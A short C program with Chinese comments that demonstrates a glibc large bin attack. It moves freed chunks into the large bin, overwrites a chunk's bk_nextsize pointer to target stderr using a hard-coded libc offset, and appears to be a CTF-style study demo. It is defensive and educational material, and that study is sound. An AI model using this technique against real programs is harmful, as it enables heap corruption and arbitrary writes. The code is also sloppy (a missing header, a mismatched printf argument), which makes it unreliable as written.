#include <stdio.h>

int main()
{
    void* p1 = malloc(0x510);
    malloc(0x20); // 防止合并
    void* p2 = malloc(0x500);
    malloc(0x20); // 防止合并

    free(p1); // p1进入unsortedbin
    malloc(0x520); // 申请一个比p1更大的堆块将p1从unsortedbin放入largebin

    long long libc_base = &printf - 0x54110;
    long long stderr_adr = libc_base + 0x1d76a0;
    *(long*)((long)p1 + 0x18) = stderr_adr - 0x20; // 将p1的bk_nextsize改为要写入的地址-0x20

    free(p2); // p2进入unsortedbin
    malloc(0x520); // 将p2放入largebin
    printf("%s",stderr_adr);

    return 0;
}